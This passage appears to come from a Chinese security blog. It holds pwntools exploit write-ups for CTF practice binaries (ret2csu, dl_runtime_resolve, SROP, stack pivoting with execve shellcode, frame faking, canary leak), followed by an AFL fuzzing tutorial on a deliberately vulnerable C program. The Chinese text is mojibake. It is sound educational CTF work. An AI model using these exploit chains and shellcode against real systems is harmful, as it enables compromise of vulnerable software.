buf\n\n```\n\nè¯¥é¢˜expå¦‚ä¸‹ï¼Œç”¨åˆ°çš„libcæ˜¯æˆ‘æœ¬åœ°ubuntu18.04çš„ï¼š\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./level5\")\nmyproc = process(myelf.path)\n\ncsu_front = 0x400600\ncsu_end = 0x40061a\n\ngot_write = myelf.got['write']\ngot_read = myelf.got['read']\nbss_addr = myelf.bss()\nmain_addr = myelf.symbols['main']\n\ndef ret2csu(rbx,rbp,r12,r13,r14,r15,next_addr):\n    payload = 'a'*0x80  # patch\n    payload += 'deadbeef'   # overwrite ebp\n    payload += p64(csu_end) # overwrite return addr, jump to csu_end\n    payload += p64(rbx)          # set rbx to r15\n    payload += p64(rbp)\n    payload += p64(r12)\n    payload += p64(r13)\n    payload += p64(r14)\n    payload += p64(r15)\n    payload += p64(csu_front)    # jump to csu_front,and exec r12\n    payload += 'a'*0x38     # 2nd csu_end,and jump to next eip\n    payload += p64(next_addr)\n    myproc.send(payload)\n    \n# write(1,got_write,8)\nmyproc.recvuntil(\"Hello, World\\n\")\nret2csu(0,1,got_write,8,got_write,1,main_addr)\nwrite_addr = u64(myproc.recv(8))\n\n# read(0,bss_addr,20)\nmyproc.recvuntil(\"Hello, World\\n\")\nret2csu(0,1,got_read,20,bss_addr,0,main_addr)\n \n# input: p64(exec_addr)+'/bin/sh\\x00'\nlibc_base = write_addr - 0x110250\nexec_addr = libc_base + 0xe4e90\nbss_data = p64(exec_addr) + \"/bin/sh\\x00\"\nmyproc.send(bss_data)\n\n# execve(\"/bin/sh\",null,null)\nmyproc.recvuntil(\"Hello, World\\n\")\nret2csu(0,1,bss_addr,0,0,bss_addr+8,main_addr)\n\n#gdb.attach(myproc)\n#log.warn(\"write addr is : 0x%x\" % write_addr)\nmyproc.interactive()\n```\n\n## é¢˜ç›®2 ret2reg\n\n## é¢˜ç›®3 BROP\n\n\n\n# é«˜çº§ ROP\n\n## é¢˜ç›®1 ret2_dl_runtime_resolve\n\n_dl_runtime_resolve: https://www.jianshu.com/p/57f6474fe4c6\n\næ·±å…¥äº†è§£GOT,PLTå’ŒåŠ¨æ€é“¾æ¥: https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html\n\nä»¥ä¸Šç»“åˆhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/ å¯ä»¥å†™ä¸€ç¯‡ç¬”è®°è®°å½•ä¸€ä¸‹ã€‚å…å¾—ä»¥åå¿˜è®°ã€‚\n\nç»ƒä¹ é¢˜ç›®æˆ‘çš„wpï¼š\n\n```python\n#coding=utf-8\nfrom pwn import *\n\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./main\")\nmyrop = ROP(\"./main\")\nmyproc = process(myelf.path)\n\nbss_addr = myelf.bss()\nnew_esp = bss_addr + 0x500\n\nmyrop.raw('a'*112)\nmyrop.read(0,new_esp,100)\nmyrop.migrate(new_esp)\n#log.warn(\"myrop is : %s\" % myrop.dump())\n\nmyproc.recvuntil(\"Welcome to XDCTF2015~!\\n\")\nmyproc.sendline(myrop.chain())\n\n#myrop2 = ROP(\"./main\")\n#sh = \"/bin/sh\"\n#myrop2.write(1,new_esp+80,len(sh))\n#myrop2.raw('b'*(80 - len(myrop2.chain())))\n#myrop2.raw(sh)\n#myrop2.raw('a'*(100 - len(myrop2.chain())))\n##log.warn(\"myrop is : %s\" % myrop2.dump())\n#myproc.sendline(myrop2.chain())\n#myproc.interactive()\n\n#myrop2 = ROP(\"./main\")\n#sh =\"/bin/sh\"\n#plt_addr = myelf.get_section_by_name('.plt').header.sh_addr\n#write_index = (myelf.plt['write'] - plt_addr)/16 -1\n#patch_wt_ret = 'aaaa'\n#myrop2.raw(plt_addr)\n#myrop2.raw(write_index*8)\n#myrop2.raw(patch_wt_ret)\n#myrop2.raw(1)\n#myrop2.raw(new_esp+80)\n#myrop2.raw(len(sh))\n#myrop2.raw('b'*(80 - len(myrop2.chain())))\n#myrop2.raw(sh)\n#myrop2.raw('b'*(100 - len(myrop2.chain())))\n#\n#myproc.sendline(myrop2.chain())\n#myproc.interactive()\n#\n\nmyrop2 = ROP('./main')\nsh = \"/bin/sh\"\nplt_addr = myelf.get_section_by_name('.plt').header.sh_addr\nrel_plt = myelf.get_section_by_name('.rel.plt').header.sh_addr\n\nwrite_got = myelf.got['write']\nr_info = 0x607\n\nfake_index = new_esp + 24 - rel_plt\n\nmyrop2.raw(plt_addr)\nmyrop2.raw(fake_index)\nmyrop2.raw('aaaa')\nmyrop2.raw(1)\nmyrop2.raw(new_esp+80)\nmyrop2.raw(len(sh))\nmyrop2.raw(write_got)\nmyrop2.raw(r_info)\nmyrop2.raw('b'*(80-len(myrop2.chain())))\nmyrop2.raw(sh)\nmyrop2.raw('b'*(100-len(myrop2.chain())))\nmyproc.sendline(myrop2.chain())\nmyproc.interactive()\n```\n\n\n\n## é¢˜ç›®2 SROP\n\nhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop\n\næ‹“å±•ï¼šhttps://bbs.pediy.com/thread-258047.htm\n\nç»ƒä¹ é¢˜ç›®æˆ‘çš„wpï¼š\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./smallest\")\nmyproc = process(myelf.path)\n\nret_start = 0x4000b0\nret_syscall = 0x4000be\n\n# read(0,&rsp,0x400); read(1,&rsp,0x400)\npayload1 = p64(ret_start)*3\nmyproc.send(payload1)\nmyproc.send('\\xb3')\nstack_addr = u64(myproc.recv()[8:16])\nlog.warn(\"stack_addr is: 0x%x\" % stack_addr)\n\n#read(0,&rsp,0x400)\nsigframe = SigreturnFrame()\nsigframe.rax = constants.SYS_read\nsigframe.rip = ret_syscall\nsigframe.rdi = 0\nsigframe.rsi = stack_addr\nsigframe.rdx = 0x400\nsigframe.rsp = stack_addr\n\npayload1 = p64(ret_start) + 'a'*8 + str(sigframe)\npayload2 = p64(ret_syscall) + 'a'*7\nmyproc.send(payload1)\nmyproc.send(payload2)\n\n# new stack - we know the addr\nsigframe = SigreturnFrame()\nsigframe.rax = constants.SYS_execve\nsigframe.rip = ret_syscall\nsigframe.rdi = stack_addr + 0x150\nsigframe.rsi = 0x0\nsigframe.rdx = 0x0\nsigframe.rsp = stack_addr\n\npayload1 = p64(ret_start) + 'a'*8 + str(sigframe)\n#log.warn(\"len: 0x%x \" % len(payload1))\npayload = payload1 + 'a'*(0x150 - len(payload1)) + \"/bin/sh\\x00\"\n\npayload2 = p64(ret_syscall) + 'a'*7\nmyproc.send(payload)\nmyproc.send(payload2)\n\nmyproc.interactive()\n```\n\n## é¢˜ç›®3 ret2VDSO\n\n\n\n# ROP Tricks\n\n## é¢˜ç›®1 stack pivoting\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./b0verfl0w')\nmyproc = process(myelf.path)\n\noffset = 36\n\n#shellcode_x86 = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\"\n#shellcode_x86 += \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\"\n#shellcode_x86 += \"\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\"\n#shellcode_x86 += \"\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\"\n\nshellcode_x86 = \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\"\n\npayload = shellcode_x86 + 'a'*(36- len(shellcode_x86)) + p32(0x08048504)\npayload += asm('sub esp,40;jmp esp') \n\nmyproc.recvuntil(\"What's your name?\")\nmyproc.sendline(payload)\n\nmyproc.interactive()\n```\n\n## é¢˜ç›®2 frame faking\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./over.over')\nmyproc = process(myelf.path)\nmylibc = myelf.libc\n\noffset = 0x58\ntotal_len = 0x60\n\n##leak stack\npayload = 'a'*0x50\nmyproc.recvuntil('>')\nmyproc.send(payload)\nprev_rbp = u64(myproc.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))\nlog.warn('recieved: 0x%x' % prev_rbp)\n\n##leak libc,puts(&got_puts)\npop_rdi_ret = 0x400793\nrbp1 = prev_rbp-0x20-0x50\nending = 0x4006be\nleak_libc_chain = 'a'*8+p64(pop_rdi_ret)+p64(myelf.got['puts'])+p64(myelf.plt['puts'])+p64(0x400676)\npayload1 = leak_libc_chain+(0x50-len(leak_libc_chain))*'a'+p64(rbp1)+p64(ending)\nmyproc.recvuntil('>')\nmyproc.send(payload1)\nleak_puts = u64(myproc.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))\nlog.warn('recieved: 0x%x' % leak_puts)\nlog.warn('mylibc.sym: 0x%x' % mylibc.sym['puts'])\nlibc_base = leak_puts - mylibc.sym['puts']\nlog.warn('libc_base: 0x%x' % libc_base)\n\n## get shell,execve(\"/bin/sh\\x00\",null,null)\npop_rdx_rsi_ret = libc_base + 0x115189\nexec_addr = libc_base + mylibc.sym['execve']\nbin_sh = libc_base + next(mylibc.search(\"/bin/sh\"))\nrbp2 = prev_rbp-0x20-0x50-0x30\n\nexec_chain = flat(['a'*8,p64(pop_rdx_rsi_ret),p64(0),p64(0),p64(pop_rdi_ret),p64(bin_sh),p64(exec_addr)])\npayload2 = exec_chain + (0x50-len(exec_chain))*'a' + p64(rbp2) + p64(ending)\nmyproc.recvuntil('>')\nmyproc.send(payload2)\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n## é¢˜ç›®3 Stack smash\n\n2015å¹´32c3 ctf readme\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('./readme.bin')\nmyproc = process(myelf.path)\n\nargv0_addr = 0x7fffffffdda8\nname_addr = 0x7fffffffdb90\nbackup_string = 0x400d21\npayload = 'a'*(argv0_addr-name_addr) + p64(backup_string)\n\nmyproc.recvuntil(\"Hello!\\nWhat's your name? \")\nmyproc.sendline(payload)\nmyproc.recvuntil(\"Please overwrite the flag: \")\nmyproc.sendline('aaa')\nmyproc.recv()\nmyproc.interactive()\n```\n\n## é¢˜ç›®4 æ ˆä¸Šçš„partial overwrite\n\n### 2018-å®‰æ’æ¯-babypie\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\nmyelf = ELF('./babypie')\nmyproc = process(myelf.path)\n\npayload1 = 'a'*(0x28+1)\n\n#leak canary\nmyproc.recvuntil(\"Input your Name:\")\nmyproc.send(payload1)\nmyproc.recvuntil('a'*0x29)\ncanary = u64('\\x00' + myproc.recv(7))\n\n#overwrite 1 byte\npayload2 = 'a'*0x28 + p64(canary) + 'a'*0x8 + '\\x3E'\n\nmyproc.recvuntil(\":\\n\")\nmyproc.send(payload2)\n\nmyproc.interactive()\n```\n\n\n\n### 2018-XNUCA-gets\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\nfor i in range(0x1000): \n    myelf = ELF('./gets')\n    myproc = process(myelf.path)\n    try:\n        payload = 'a'*24 + p64(0x40059b)\n        payload += 'aaaaaaaa'*5 + p64(0x40059b)\n        payload += 'aaaaaaaa'*5 + p64(0x40059b)\n        payload += 'a' * 8 * 5 + '\\x26\\x02'\n        myproc.sendline(payload)\n        myproc.sendline('ls')\n        data = myproc.recv()\n        print data\n        myproc.interactive()\n        myproc.close()\n    except Exception:\n        myproc.close()\n        continue\n```","categories":["CTF"]},{"title":"afl","url":"/2020/06/30/afl/","content":"\n# 1 ä»ä¸€ä¸ªtestç¨‹åºå¼€å§‹\n\n## 1.1 å®‰è£…AFL\n\né¦–å…ˆï¼Œæ£€æŸ¥æœ¬åœ°çš„clangå’Œllvmæ˜¯å¦å®‰è£…ï¼Œè‹¥æœªå®‰è£…åˆ™å®‰è£…ä¸€ä¸‹\n\n```shell\nsudo apt-get install clang\nsudo apt-get install llvm\n```\n\nä»¥ä¸Šç¯å¢ƒç¡®è®¤å¥½åï¼Œä¸‹è½½å¹¶å®‰è£…AFL\n\n```shell\nwget http://lcamtuf.coredump.cx/afl/releases/afl-2.52b.tgz\ntar -zxvf afl-2.52b.tgz\ncd afl-2.52b\nmake\nsudo make install\n```\n\nä»¥ä¸Šæ“ä½œåšå®Œï¼ŒAFLå°±ç®—æ˜¯å®‰è£…å®Œæ¯•å•¦ã€‚ç°åœ¨æ¥çœ‹çœ‹AFLå®‰è£…å‰åä»£ç ç›®å½•ä¸­æ–‡ä»¶çš„å·®åˆ«ã€‚ä»¥ä¸‹å…ˆæ˜¯å®‰è£…å‰çš„ç›®å½•ï¼š\n\n```shell\ndrwxr-xr-x 10  500  500   4096 Nov  5  2017 .\ndrwxr-xr-x  3 root root   4096 Jun  2 09:49 ..\n-rw-r--r--  1  500  500  23755 Nov  5  2017 afl-analyze.c\n-rw-r--r--  1  500  500  15273 Nov  5  2017 afl-as.c\n-rw-r--r--  1  500  500  21090 Nov  5  2017 afl-as.h\n-rwxr-xr-x  1  500  500  11392 Nov  5  2017 afl-cmin\n-rw-r--r--  1  500  500 206076 Nov  5  2017 afl-fuzz.c\n-rw-r--r--  1  500  500   8597 Nov  5  2017 afl-gcc.c\n-rw-r--r--  1  500  500   5336 Nov  5  2017 afl-gotcpu.c\n-rwxr-xr-x  1  500  500   4913 Nov  5  2017 afl-plot\n-rw-r--r--  1  500  500  16527 Nov  5  2017 afl-showmap.c\n-rw-r--r--  1  500  500  25235 Nov  5  2017 afl-tmin.c\n-rwxr-xr-x  1  500  500   3655 Nov  5  2017 afl-whatsup\n-rw-r--r--  1  500  500  12565 Nov  5  2017 alloc-inl.h\n-rw-r--r--  1  500  500  11216 Nov  5  2017 config.h\n-rw-r--r--  1  500  500   6574 Nov  5  2017 debug.h\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 dictionaries\ndrwxr-xr-x  4  500  500   4096 Nov  5  2017 docs\ndrwxr-xr-x 12  500  500   4096 Nov  5  2017 experimental\n-rw-r--r--  1  500  500   2065 Nov  5  2017 hash.h\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 libdislocator\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 libtokencap\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 llvm_mode\n-rw-r--r--  1  500  500   6987 Nov  5  2017 Makefile\ndrwxr-xr-x  3  500  500   4096 Nov  5  2017 qemu_mode\nlrwxrwxrwx  1  500  500     24 Nov  5  2017 QuickStartGuide.txt -> docs/QuickStartGuide.txt\nlrwxrwxrwx  1  500  500     11 Nov  5  2017 README -> docs/README\ndrwxr-xr-x  6  500  500   4096 Nov  5  2017 testcases\n-rw-r--r--  1  500  500    789 Nov  5  2017 test-instr.c\n-rw-r--r--  1  500  500   2292 Nov  5  2017 types.h\n```\n\nå®‰è£…å®Œæˆåï¼Œä»£ç ç›®å½•ä¸­çš„æ–‡ä»¶\n\n```shell\ndrwxr-xr-x 10  500  500   4096 Jun  2 09:47 .\ndrwxr-xr-x  7 root root   4096 Jun  1 18:42 ..\n-rwxr-xr-x  1 root root  90792 Jun  2 09:46 afl-analyze\n-rw-r--r--  1  500  500  23755 Nov  5  2017 afl-analyze.c\n-rwxr-xr-x  1 root root  50808 Jun  2 09:46 afl-as\n-rw-r--r--  1  500  500  15273 Nov  5  2017 afl-as.c\n-rw-r--r--  1  500  500  21090 Nov  5  2017 afl-as.h\nlrwxrwxrwx  1 root root      7 Jun  2 09:46 afl-clang -> afl-gcc\nlrwxrwxrwx  1 root root      7 Jun  2 09:46 afl-clang++ -> afl-gcc\n-rwxr-xr-x  1  500  500  11392 Nov  5  2017 afl-cmin\n-rwxr-xr-x  1 root root 582872 Jun  2 09:46 afl-fuzz\n-rw-r--r--  1  500  500 206076 Nov  5  2017 afl-fuzz.c\nlrwxrwxrwx  1 root root      7 Jun  2 09:46 afl-g++ -> afl-gcc\n-rwxr-xr-x  1 root root  35376 Jun  2 09:46 afl-gcc\n-rw-r--r--  1  500  500   8597 Nov  5  2017 afl-gcc.c\n-rwxr-xr-x  1 root root  32240 Jun  2 09:46 afl-gotcpu\n-rw-r--r--  1  500  500   5336 Nov  5  2017 afl-gotcpu.c\n-rwxr-xr-x  1  500  500   4913 Nov  5  2017 afl-plot\n-rwxr-xr-x  1 root root  76840 Jun  2 09:46 afl-showmap\n-rw-r--r--  1  500  500  16527 Nov  5  2017 afl-showmap.c\n-rwxr-xr-x  1 root root 106280 Jun  2 09:46 afl-tmin\n-rw-r--r--  1  500  500  25235 Nov  5  2017 afl-tmin.c\n-rwxr-xr-x  1  500  500   3655 Nov  5  2017 afl-whatsup\n-rw-r--r--  1  500  500  12565 Nov  5  2017 alloc-inl.h\nlrwxrwxrwx  1 root root      6 Jun  2 09:46 as -> afl-as\n-rw-r--r--  1  500  500  11216 Nov  5  2017 config.h\n-rw-r--r--  1  500  500   6574 Nov  5  2017 debug.h\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 dictionaries\ndrwxr-xr-x  4  500  500   4096 Nov  5  2017 docs\ndrwxr-xr-x 12  500  500   4096 Nov  5  2017 experimental\n-rw-r--r--  1  500  500   2065 Nov  5  2017 hash.h\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 libdislocator\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 libtokencap\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 llvm_mode\n-rw-r--r--  1  500  500   6987 Nov  5  2017 Makefile\ndrwxr-xr-x  3  500  500   4096 Nov  5  2017 qemu_mode\nlrwxrwxrwx  1  500  500     24 Nov  5  2017 QuickStartGuide.txt -> docs/QuickStartGuide.txt\nlrwxrwxrwx  1  500  500     11 Nov  5  2017 README -> docs/README\ndrwxr-xr-x  6  500  500   4096 Nov  5  2017 testcases\n-rw-r--r--  1  500  500    789 Nov  5  2017 test-instr.c\n-rw-r--r--  1  500  500   2292 Nov  5  2017 types.h\n```\n\nå¯ä»¥çœ‹åˆ°aflå®‰è£…åï¼Œæ–‡ä»¶å¤¹ä¸‹å¤šäº†äº›äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ˜¯ä¸æ˜¯å¾ˆç®€å•ã€‚ä½†æ˜¯ï¼Œåœ¨ä½¿ç”¨AFLè¿›è¡Œfuzzæµ‹è¯•å‰ï¼Œä¸€å®šè¦è®¾ç½®ä¸€ä¸‹**core_pattern**ï¼Œå¦åˆ™ä¼šæŠ¥é”™å“¦ã€‚\n\n```shell\nroot@x:~/afl-test# cat /proc/sys/kernel/core_pattern\n|/usr/share/apport/apport %p %s %c %d %P\nroot@x:~/afl-test# echo core > /proc/sys/kernel/core_pattern\nroot@x:~/afl-test# cat /proc/sys/kernel/core_pattern\ncore\n```\n\n## 1.2 è·‘èµ·æ¥çœ‹çœ‹\n\næµ‹è¯•ç¨‹åºçš„ä»£ç ä½¿ç”¨äº†å…ˆçŸ¥ç¤¾åŒºçš„ç¤ºä¾‹ä»£ç ï¼Œå¦‚ä¸‹ã€‚å¹³æ—¶æˆ‘ä»¬ç¼–è¯‘cä»£ç ä½¿ç”¨çš„æ˜¯gccï¼Œç°åœ¨ä¸ºäº†ä½¿ç”¨AFLè¿›è¡Œfuzzï¼Œæˆ‘ä»¬å¿…é¡»ä½¿ç”¨1.1èŠ‚ä¸­ç¼–è¯‘å‡ºæ¥çš„afl-gccå¯¹ç›®æ ‡ä»£ç è¿›è¡Œæ’æ¡©ç¼–è¯‘ã€‚\n\n```c\n#include <stdio.h> \n#include <stdlib.h> \n#include <unistd.h> \n#include <string.h> \n#include <signal.h> \n\nint vuln(char *str)\n{\n    int len = strlen(str);\n    if(str[0] == 'A' && len == 66)\n    {\n        raise(SIGSEGV);\n        //å¦‚æœè¾“å…¥çš„å­—ç¬¦ä¸²çš„é¦–å­—ç¬¦ä¸ºAå¹¶ä¸”é•¿åº¦ä¸º66ï¼Œåˆ™å¼‚å¸¸é€€å‡º\n    }\n    else if(str[0] == 'F' && len == 6)\n    {\n        raise(SIGSEGV);\n        //å¦‚æœè¾“å…¥çš„å­—ç¬¦ä¸²çš„é¦–å­—ç¬¦ä¸ºFå¹¶ä¸”é•¿åº¦ä¸º6ï¼Œåˆ™å¼‚å¸¸é€€å‡º\n    }\n    else\n    {\n        printf(\"it is good!\\n\");\n    }\n    return 0;\n}\n\nint main(int argc, char *argv[])\n{\n    char buf[100]={0};\n    gets(buf);//å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´\n    printf(buf);//å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´\n    vuln(buf);\n\n    return 0;\n}\n```\n\næ¥ä¸‹æ¥ï¼Œéœ€è¦åšä»¥ä¸‹ä¸‰ä»¶äº‹ï¼š\n\nï¼ˆ1ï¼‰ä½¿ç”¨afl-gccç¼–è¯‘ç›®æ ‡ä»£ç ï¼ˆå³æ’æ¡©ï¼‰\n\n```shell\n$ afl-gcc test.c -g -o test\n```\n\nï¼ˆ2ï¼‰æ–°å»ºæµ‹è¯•ç”¨ä¾‹ï¼ˆæµ‹è¯•ç”¨ä¾‹å³å¾…æµ‹ç¨‹åºçš„è¾“å…¥ï¼Œå¯ä»¥éšæ„ç»™ä¸ªæ–‡ä»¶ä½œä¸ºèµ·å§‹ç”¨ä¾‹ã€‚AFLä¼šåœ¨æ­¤ç”¨ä¾‹çš„åŸºç¡€ä¸Šè¿›è¡Œå˜å¼‚ï¼Œå¥½çš„æµ‹è¯•ç”¨ä¾‹æœ‰åŠ©äºæ›´å¿«å‘ç°æ›´å¤šbugï¼‰\n\n```shell\n$ mkdir testcase\n$ cd testcase\n$ vim file123\n\t123\n\tqwe\n```\n\nï¼ˆ3ï¼‰è¾“å‡ºæ–‡ä»¶å¤¹ï¼ˆå‘ç°çš„bugç­‰ä¿¡æ¯ä¼šè¾“å‡ºåˆ°è¯¥ç›®å½•ä¸‹ï¼‰\n\n```shell\n$ mkdir output\n```\n\næœ€åï¼ŒæŒ‡å®šå¥½ä»¥ä¸Šä¸‰é¡¹çš„ä½ç½®ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°±ä¼šè¿›å…¥AFLä¸»é¢æ¿å¼€å§‹fuzzå•¦\n\n```shell\nafl-fuzz -i testcase/ -o output/ ./test\n```\n\nè¿™é‡Œç»™ä¸€ä¸‹æˆ‘fuzzå®Œæˆåï¼ˆctrl +cï¼‰çš„æƒ…å†µï¼š\n\n```shell\nroot@x:~/afl-test# afl-fuzz -i testcase/ -o output/ ./test\nafl-fuzz 2.52b by <lcamtuf@google.com>\n[+] You have 8 CPU cores and 1 runnable tasks (utilization: 12%).\n[+] Try parallel jobs - see /usr/local/share/doc/afl/parallel_fuzzing.txt.\n[*] Checking CPU core loadout...\n[+] Found a free CPU core, binding to #0.\n[*] Checking core_pattern...\n[*] Setting up output directories...\n[+] Output directory exists but deemed OK to reuse.\n[*] Deleting old session data...\n[+] Output dir cleanup successful.\n[*] Scanning 'testcase/'...\n[+] No auto-generated dictionary tokens to reuse.\n[*] Creating hard links for all input files...\n[*] Validating target binary...\n[*] Attempting dry run with 'id:000000,orig:file1'...\n[*] Spinning up the fork server...\n[+] All right - fork server is up.\n    len = 8, map size = 5, exec speed = 306 us\n[+] All test cases processed.\n\n[+] Here are some useful stats:\n\n    Test case count : 1 favored, 0 variable, 1 total\n       Bitmap range : 5 to 5 bits (average: 5.00 bits)\n        Exec timing : 306 to 306 us (average: 306 us)\n\n[*] No -t option specified, so I'll use exec timeout of 20 ms.\n[+] All set and ready to roll!\n\n                        american fuzzy lop 2.52b (test)\n\nâ”Œâ”€ process timing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€ overall results â”€â”€â”€â”€â”€â”\nâ”‚        run time : 0 days, 0 hrs, 24 min, 9 sec       â”‚  cycles done : 2574   â”‚\nâ”‚   last new path : 0 days, 0 hrs, 24 min, 9 sec       â”‚  total paths : 3      â”‚\nâ”‚ last uniq crash : 0 days, 0 hrs, 14 min, 10 sec      â”‚ uniq crashes : 6      â”‚\nâ”‚  last uniq hang : none seen yet                      â”‚   uniq hangs : 0      â”‚\nâ”œâ”€ cycle progress â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€ map coverage â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚  now processing : 2 (66.67%)        â”‚    map density : 0.01% / 0.01%         â”‚\nâ”‚ paths timed out : 0 (0.00%)         â”‚ count coverage : 1.00 bits/tuple       â”‚\nâ”œâ”€ stage progress â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€ findings in depth â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚  now trying : splice 9              â”‚ favored paths : 3 (100.00%)            â”‚\nâ”‚ stage execs : 47/48 (97.92%)        â”‚  new edges on : 3 (100.00%)            â”‚\nâ”‚ total execs : 5.41M                 â”‚ total crashes : 385k (6 unique)        â”‚\nâ”‚  exec speed : 3330/sec              â”‚  total tmouts : 1 (1 unique)           â”‚\nâ”œâ”€ fuzzing strategy yields â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€ path geometry â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚   bit flips : 0/128, 0/125, 0/119                   â”‚    levels : 2          â”‚\nâ”‚  byte flips : 0/16, 0/13, 0/7                       â”‚   pending : 0          â”‚\nâ”‚ arithmetics : 2/896, 0/129, 0/9                     â”‚  pend fav : 0          â”‚\nâ”‚  known ints : 0/78, 0/339, 0/308                    â”‚ own finds : 2          â”‚\nâ”‚  dictionary : 0/0, 0/0, 0/0                         â”‚  imported : n/a        â”‚\nâ”‚       havoc : 4/2.31M, 2/3.09M                      â”‚ stability : 100.00%    â”‚\nâ”‚        trim : 83.10%/16, 0.00%                      â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n^Câ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜          [cpu000: 23%]\n\n+++ Testing aborted by user +++\n[+] We're done here. Have a nice day!\n```\n\n## 1.3 åˆ†æç»“æœ\n\nfuzzå®Œæˆåï¼Œæ ¹æ®AFLé¢æ¿çš„ä¿¡æ¯æˆ‘ä»¬çŸ¥é“æœ‰6ä¸ªcrashï¼Œå› æ­¤æˆ‘ä»¬è¿›å…¥outputç›®å½•å»åˆ†æ\n\n```shell\nroot@x:~/afl-test/output# ls -al\ntotal 108\ndrwxr-xr-x 5 root root  4096 Jun  2 10:15 .\ndrwxr-xr-x 4 root root  4096 Jun  2 10:08 ..\ndrwx------ 2 root root  4096 Jun  2 10:25 crashes\n-rw------- 1 root root     1 Jun  2 10:39 .cur_input\n-rw------- 1 root root 65536 Jun  2 10:16 fuzz_bitmap\n-rw------- 1 root root   739 Jun  2 10:39 fuzzer_stats\ndrwx------ 2 root root  4096 Jun  2 10:15 hangs\n-rw------- 1 root root 15250 Jun  2 10:39 plot_data\ndrwx------ 3 root root  4096 Jun  2 10:15 queue\n```\n\n- crashes/ æ–‡ä»¶å¤¹ä¸­å­˜æ”¾äº†fuzzè¿‡ç¨‹ä¸­äº§ç”Ÿçš„crashæ ·ä¾‹\n\n- hangs/ æ–‡ä»¶å¤¹ä¸­å­˜æ”¾äº†fuzzè¿‡ç¨‹ä¸­äº§ç”Ÿçš„è¶…æ—¶æ ·ä¾‹\n\n- queue/ æ–‡ä»¶å¤¹ä¸­å­˜æ”¾äº†fuzzè¿‡ç¨‹ä¸­ä¸åŒæ‰§è¡Œè·¯å¾„çš„æµ‹è¯•ç”¨ä¾‹\n\nä½¿ç”¨`xxd`å‘½ä»¤æŸ¥çœ‹äº§ç”Ÿçš„6ä¸ªcrashæ ·ä¾‹ï¼Œç„¶åå¯ä»¥å°†æ ·ä¾‹ä½œä¸ºè¾“å…¥ç”¨gdbè°ƒè¯•testç¨‹åºã€‚\n\n```shell\nroot@x:~/afl-test/output/crashes# xxd id:000000,sig:06,src:000000,op:havoc,rep:64\n00000000: 1f20 0820 fe1f 2004 0020 200c 0064 1ffe  . . .. ..  ..d..\n00000010: 017f 2033 ff20 2000 180b 2020 2008 20e2  .. 3.  ...   . .\n00000020: 1f20 e21f ff01 00ff ff20 2020 2002 0024  . .......    ..$\n00000030: ff00 0000 0000 0100 203a 200c 20e2 1f01  ........ : . ...\n00000040: 2020 0019 0110 510b 2020 2002 0020 2020    ....Q.   